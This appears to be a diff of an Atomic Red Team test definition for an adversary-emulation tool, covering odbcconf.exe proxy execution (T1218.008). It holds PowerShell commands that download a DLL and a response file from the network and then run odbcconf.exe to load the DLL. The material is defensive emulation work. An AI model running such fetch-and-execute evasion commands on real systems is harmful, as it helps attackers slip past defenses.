@@ -6,25 +6,25 @@
   tactic: stealth
   technique:
     attack_id: T1218.008
-    name: 'Signed Binary Proxy Execution: Odbcconf'
+    name: 'System Binary Proxy Execution: Odbcconf'
   platforms:
     windows:
       sh:
         command: 'if (Test-Path "PathToAtomicsFolder\T1218.008\bin\T1218.008.rsp")
           {exit 0} else {exit 1}; then : ; else Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/T1218.008.rsp"
-          -OutFile "PathToAtomicsFolder\T1218.008\bin\T1218.008.rsp"; Invoke-WebRequest
-          "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/o.dll"
-          -OutFile "PathToAtomicsFolder\T1218.008\bin\\o.dll"; fi; cd "PathToAtomicsFolder\T1218.008\bin\";
-          odbcconf.exe -f "T1218.008.rsp"'
+          -OutFile "PathToAtomicsFolder\T1218.008\bin\T1218.008.rsp" -UseBasicParsing;
+          Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/o.dll"
+          -OutFile "PathToAtomicsFolder\T1218.008\bin\\o.dll" -UseBasicParsing; fi;
+          cd "PathToAtomicsFolder\T1218.008\bin\"; odbcconf.exe -f "T1218.008.rsp"'
   plugin: atomic
   singleton: false
   repeatable: true
   delete_payload: false
   privilege: ''
   buckets:
+  - stealth
   - t1218.008
   - atomic-red-team
-  - stealth
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -45,12 +45,12 @@
 
         '
       get_prereq_command: 'Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/T1218.008.rsp"
-        -OutFile "#{rsp_file_path}#{rsp_file_name}"
+        -OutFile "#{rsp_file_path}#{rsp_file_name}" -UseBasicParsing
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.008/bin/o.dll"
-        -OutFile "#{rsp_file_path}\o.dll"
+        -OutFile "#{rsp_file_path}\o.dll" -UseBasicParsing
 
         '
     technique_created: '2020-01-24T15:01:32.917Z'
     atomic_guid: 331ce274-f9c9-440b-9f8c-a1006e1fce0b
-    import_timestamp: '2026-10-20T07:08:26.646847Z'
+    import_timestamp: '2026-10-21T07:01:49.407421Z'
